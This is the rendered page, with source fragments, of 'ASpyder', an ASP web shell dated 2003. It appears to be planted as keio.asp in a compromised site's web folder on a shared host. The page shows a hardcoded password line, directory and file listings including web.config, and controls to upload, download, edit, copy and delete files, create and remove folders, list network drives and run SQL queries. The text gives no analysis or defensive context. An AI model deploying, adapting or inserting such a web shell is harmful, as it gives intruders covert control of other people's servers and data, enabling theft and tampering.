...
password = "keio" ' <---Your password here
...
<title>F:\freehost\zxyzch10a\web</title>
</head>
<body bgcolor=black text=white topAprgin="0">
<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->
...
<SCRIPT Language="VBScript">
sub getit(thestuff)
if right("F:\freehost\zxyzch10a\web\",1) <> "\" Then
   document.myform.txtpath.value = "F:\freehost\zxyzch10a\web\" & "\" & thestuff
Else
   document.myform.txtpath.value = "F:\freehost\zxyzch10a\web\" & thestuff
End If
document.myform.submit()
...
<font face=arial size=-1 color=red>Path not found...</font>
<center><B>ASP</b><font color=#ff8300 face=webdings size=6 >!</font><B><font color=Gray >Spyder</font> Apr2003</B><BR><font color=black size=-2><TT>by ~sir_shagalot</TT></font></center>
<font face=Courier>
<table><tr><td>
<form method="post" action="/keio.asp" name="myform" >
<Table bgcolor=#505050 ><tr><td bgcolor=#505050 >
<font face=Arial size=-2 color=#ff8300 > PATH INFO : </font></td><td align=right ><font face=Arial size=-2 color=#ff8300 >Volume Label:</font>  </td></tr>
<tr><td colspan=2 cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://www.634629883.com/keio.asp</Font><BR><font face=wingdings color=Gray >1</font><font face=Arial size=+1 > F:\freehost\zxyzch10a\web\</Font>
<BR><input type=text width=40 size=60 name=txtpath value="F:\freehost\zxyzch10a\web\" ><input type=submit name=cmd value="  View  " >
</td></tr></form></table>
</td><td><center>
<table bgcolor=#505050 cellpadding=4><tr><td bgcolor=black ><a href="/keio.asp?getDRVs=@&txtpath=F:\freehost\zxyzch10a\web"><font size=-2 face=arial>Retrieve Available Network Drives</a></td></tr>
<tr><td bgcolor=black align=right><A HREF="/keio.asp?qa=@&txtpath=F:\freehost\zxyzch10a\web"><font size=-2 face=arial>SQL Query Analyser</A></td></tr>
<tr><td bgcolor=black  align=right><A HREF="/keio.asp?logoff=@&...thankyou.for.using.ASpyder....~sir_shagalot!..[shagzzz.cjb.net]"><font size=-2 face=arial>+++LOGOFF+++</A></td></tr></table>
</td></tr></table>
<p align=center ><Table width=75% bgcolor=#505050 cellpadding=4 ><tr><td>
<form method="post" action="/keio.asp" ><font face=arial size=-1 >Delete file from current directory:</font><BR>
<select size=1 name=ToDelete >
<option>------------------------------</option>"
<option>index.asp</option><option>keio.asp</option><option>lianxiwome5n.jpg</option><option>nav8.psd</option><option>nav88.psd</option><option>search.asp</option><option>taglist.asp</option><option>tags.asp</option><option>web.config</option><option>联系我们PSD.psd</option></select><input type=hidden name=txtpath value="F:\freehost\zxyzch10a\web"><input type=Submit name=cmd value=Delete ></form></td><td><form method=post name=frmCopyFile action="/keio.asp" ><font face=arial size=-1 >Copy file too current directory:</font><br><select size=1 name=ToCopy ><option>------------------------------</option></select><input type=hidden name=txtpath value="F:\freehost\zxyzch10a\web"><input type=Submit name=cmd value="  Copy " ></form></td></tr></Table><table Cellpading=2 width=75% bgcolor=#505050 ><tr><td valign=top width=50% bgcolor=#303030 >Folders:<BR><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#c8c8c8><span style='cursor: hand;' OnClick="getit('..')">..</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('about')">about</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('admin')">admin</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('apply')">apply</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('config')">config</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('content')">content</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('css')">css</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('custom')">custom</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('data')">data</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('flash')">flash</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('gbook')">gbook</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('images')">images</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('inc')">inc</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('js')">js</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('list')">list</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('member')">member</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('plug')">plug</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('productbuy')">productbuy</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('rss')">rss</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('templates')">templates</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('upload')">upload</span></FONT><BR>
<BR><center><form method=post action="/keio.asp?txtpath=F:\freehost\zxyzch10a\web">
<table bgcolor=#505050 cellspacing=4><tr><td>
<font face=arial size=-1 title="Create and Delete folders by entering their names here manually.">Directory:</td></tr>
<tr><td align=right ><input type=text size=20 name=DirName><BR>
<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>
</tr></td></table></form>
<BR></td><td valign=top width=50% bgcolor=#303030 >Files:<BR><BR>
	<form method=post name=frmCopySelected action="/keio.asp?txtpath=F:\freehost\zxyzch10a\web">
<center><select name=Fname size=13 style="background-color: rgb(48,48,48); color: rgb(210,210,210)"><option value="index.asp">&nbsp;&nbsp;index.asp -- [1 kb]</option><option value="keio.asp">&nbsp;&nbsp;keio.asp -- [35 kb]</option><option value="lianxiwome5n.jpg">&nbsp;&nbsp;lianxiwome5n.jpg -- [32 kb]</option><option value="nav8.psd">&nbsp;&nbsp;nav8.psd -- [169 kb]</option><option value="nav88.psd">&nbsp;&nbsp;nav88.psd -- [182 kb]</option><option value="search.asp">&nbsp;&nbsp;search.asp -- [1 kb]</option><option value="taglist.asp">&nbsp;&nbsp;taglist.asp -- [2 kb]</option><option value="tags.asp">&nbsp;&nbsp;tags.asp -- [1 kb]</option><option value="web.config">&nbsp;&nbsp;web.config -- [1 kb]</option><option value="联系我们PSD.psd">&nbsp;&nbsp;联系我们PSD.psd -- [152 kb]</option></select><br><input type=submit name=cmd value="   Copy   "><input type=submit name=cmd value="Edit/Create"><input type=submit name=cmd value=Download>
	</form>
<BR></td></tr><tr><td align=center ><B>Listed: 20</b></td><td align=center ><b>Listed: 10</b></td></tr></table><BR>
	<form method="post" ENCTYPE="multipart/form-data" action="/keio.asp?upload=@&txtpath=F:\freehost\zxyzch10a\web">
<table bgcolor="#505050" cellpadding="8">
  <tr>
    <td bgcolor=#303030 valign="bottom"><font size=+1 face=wingdings color=Gray >2</font><font face="Arial" size=-2 color="#ff8300"> SELECT FILES TO UPLOAD:<br>
    <input TYPE="FILE" SIZE="53" NAME="FILE1"><BR>
...
</font><HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=1 face=arial>[ System: 2012-10-20 17:07:15 ]</font></p><BR>
</body></html>
